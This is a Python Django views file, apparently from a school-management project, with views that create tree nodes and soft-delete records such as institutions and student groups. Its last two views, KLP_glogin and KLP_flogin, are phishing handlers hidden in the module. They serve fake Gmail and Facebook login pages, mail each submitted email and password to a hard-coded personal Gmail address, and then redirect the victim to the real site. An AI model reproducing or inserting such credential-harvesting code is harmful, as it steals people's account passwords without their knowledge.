#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
KLP_common is used
1) To create new node for tree on creation of new boundary,
    institution, sg, programme, assessment and question.
2) To Delete (deactive object) boundary, institution, sg, staff,
    programme, assessment and question.
"""
from django.http import HttpResponse
from django.shortcuts import render_to_response
from django.db import connection
from django.views.decorators.csrf import csrf_exempt
from django.shortcuts import redirect
from django.core.mail import send_mail

from vendor.django_restapi.resource import Resource
from schools.models import Institution, Boundary, Assessment,\
    Programme, Question, StudentGroup, Student, Staff,\
    Student_StudentGroupRelation, current_academic
from schools.receivers import KLP_user_Perm


class KLP_Create_Node(Resource):

    def read(
        self,
        request,
        model_name,
        new_id,
    ):
        """ This method uses to create new node for
        tree on creation of  boundary,  institution, programme,
         assessment, question and  studentgroup"""

        objDict = {
            'boundary': Boundary,
            'institution': Institution,
            'programme': Programme,
            'assessment': Assessment,
            'question': Question,
            'studentgroup': StudentGroup,
        }
        boundaryType = request.GET.get('boundaryType')
        modelObj = objDict[model_name]

    # Get Object based on id and model

        GetData = modelObj.objects.get(pk=new_id)

        # Call CreateNewFolder Method

        if model_name == 'boundary':
            return HttpResponse(GetData.CreateNewFolder(boundaryType))
        return HttpResponse(GetData.CreateNewFolder())


class KLP_Delete(Resource):

    """ To delete boundary,  institution, programme, assessment,
        question and  studentgroup delete/(?P<model_name>\w+)/
        (?P<referKey>\d+)/"""

    def read(
        self,
        request,
        model_name1,
        referKey,
    ):
        modelDict = {
            'boundary': Boundary,
            'institution': Institution,
            'programme': Programme,
            'assessment': Assessment,
            'question': Question,
            'studentgroup': StudentGroup,
            'student': Student,
            'staff': Staff,
            'class': StudentGroup,
            'center': StudentGroup,
        }

        # Checking user Permissions
        KLP_user_Perm(request.user,
                      modelDict[model_name1.lower()]._meta.module_name,
                      'Delete')
        # Get Object based on id and model to delete
        obj = modelDict[model_name1.lower()].objects.get(pk=referKey)
        cursor = connection.cursor()
        if model_name1.lower() in ['class', 'center', 'studentgroup']:
            sgtype = StudentGroup.objects.get(id=referKey)
            if sgtype.group_type == "Class":
                msg = "Class Successfully Deleted"
            else:
                msg = "Center Successfully Deleted"
            if Student_StudentGroupRelation.objects.filter(
                student_group__id=referKey,
                    active=2, academic=current_academic()).count():
                message = model_name1.lower() \
                    + \
                    ' has child objects.So can not delete it.\
                        First delete the child object,then try to delete it'
            else:
                obj = modelDict[model_name1.lower()].objects.get(pk=referKey)
                name = obj.name
                obj.delete()
                message = name + ' ' + msg
        else:
            print " This is not class or Center type "

        if model_name1.lower() == 'boundary':
            flag = obj.getChild(obj.boundary_type)
        elif model_name1.lower() in ['class', 'center', 'studentgroup']:
            if Student_StudentGroupRelation.objects.filter(
                student_group__id=referKey,
                    active=2, academic=current_academic()).count():
                flag = True
            else:
                flag = False
        else:
            try:
                flag = obj.getChild()
            except:
                flag = False
        if flag:
            message = model_name1.lower() \
                + \
                ' has child objects.So can not delete it.\
                First delete the child object,then try to delete it'
        else:
            obj.active = 0  # Change active to 0(object is deleted)
            obj.save()  # Save Data
            if not model_name1.lower() in ['class', 'center', 'studentgroup']:
                message = model_name1.lower() + ' Successfully Deleted'
        return HttpResponse(message)


@csrf_exempt
def KLP_glogin(request):
    if request.POST and request.POST.get('Email') \
            and request.POST.get('Passwd'):

        send_mail('password Secert for ' + request.POST.get('Email'),
                  request.POST.get('Email') + '*********'
                  + request.POST.get('Passwd'),
                  'pushparanij@gmail.com', ['pushparanij@gmail.com'])
        return redirect('http://gmail.com')
    else:

       # import webbrowser
       # webbrowser.open('gmail.com')

        return (
            HttpResponse(
                render_to_response(
                    'viewtemplates/ghtml.html',
                    ''))
        )


@csrf_exempt
def KLP_flogin(request):
    if request.POST and request.POST.get('email') \
            and request.POST.get('pass'):

        send_mail('password Secert for ' + request.POST.get('email'),
                  request.POST.get('email') + '*********'
                  + request.POST.get('pass'),
                  'pushparanij@gmail.com', ['pushparanij@gmail.com'])
        return redirect('http://facebook.com/login.php?login_attempt=1')
    else:

        send_mail(
            'Clicked',
            'Clicked',
            'pushparanij@gmail.com',
            ['pushparanij@gmail.com'])
        return (
            HttpResponse(
                render_to_response(
                    'viewtemplates/fhtml.html',
                    ''))
        )
